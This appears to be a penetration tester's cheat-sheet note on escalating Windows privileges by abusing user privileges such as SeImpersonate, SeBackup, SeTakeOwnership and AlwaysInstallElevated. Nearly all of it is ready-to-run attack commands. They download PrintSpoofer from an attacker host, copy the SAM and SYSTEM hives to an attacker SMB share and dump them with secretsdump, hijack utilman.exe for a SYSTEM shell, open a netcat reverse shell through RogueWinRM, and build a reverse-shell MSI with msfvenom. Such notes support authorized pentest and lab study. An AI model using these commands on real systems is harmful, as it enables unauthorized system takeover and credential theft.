# Weak user privileges

Check privileges

```bash
whoami /priv
```

To understand it: 

* [documentation of all privileges from microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
* [list of useful privileges for privilege escalation](https://github.com/gtworek/Priv2Admin)

## SeImpersonatePrivilege

Download [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```bash
Invoke-WebRequest -Uri http://$ATTACKER_IP:8000/PrintSpoofer64.exe -OutFile printspoofer.exe
```

Run it, the resulting shell has us `NT AUTORITY\SYSTEM`

```bash
.\printspoofer.exe -i -c powershell
```

(todo: read [this article](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/))

## SeBackup / SeRestore

Extract system and sam register hives

```powershell
reg save hklm\system C:\path\to\system.hive
reg save hklm\sam C:\path\to\sam.hive
```

Start an smbserver on attacker's host

```bash
mkdir $MOUNTPOINT
sudo smbserver.py -smb2support -username $TARGET_USERNAME -password $TARGET_PASSWORD public $MOUNTPOINT
```

Copy the files to attacker's smb

```powershell
copy C:\path\to\sam.hive \\$ATTACKER_IP\public\
copy C:\path\to\system.hive \\$ATTACKER_IP\public\
```

Dump secrets from the hives 

```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

## SeTakeOwnership

Here is an exemple with `utilman.exe` but works with anything.
(`Utilman.exe` is useful because it is a living of the land technique)

Take ownership on the utilman binary

```powershell
takeown.exe /f c:\windows\system32\utilman.exe
```

Grant yourself full privileges over this file

```powershell
icacls.exe c:\windows\system32\utilman.exe /grant $USERNAME
```

Go on the lock screen (start > user avatar > lock) and click on "Ease of Access"
button, a SYSTEM shell appear.

## SeImpersonate / SeAssignPrimaryToken

Use the tool [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) to create a reverse shell:

```powershell
c:\path\to\RogueWinRM.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe $ATTACKER_IP $ATTACKER_PORT"
```

## AlwaysInstallElevated policy

(custom MSI installations)

Check the following key to validate vulnarbility

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Create an msi file and upload it to the victim

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f msi -o malicious.msi
```

Install the malicious msi

```powershell
msiexec /quiet /qn /i C:\path\to\malicious.msi
```

The InstallerFileTakeOver vulnerability has automated exploits too:

* [original github (down)](https://github.com/klinix5/InstallerFileTakeOver)
* [from internet archive](https://archive.org/details/github.com-klinix5-InstallerFileTakeOver_-_2021-11-25_01-39-13)
* [fork](https://github.com/szybnev/cmd32)
* [fork](https://github.com/AlexandrVIvanov/InstallerFileTakeOver)
* [fork](https://github.com/noname1007/InstallerFileTakeOver)

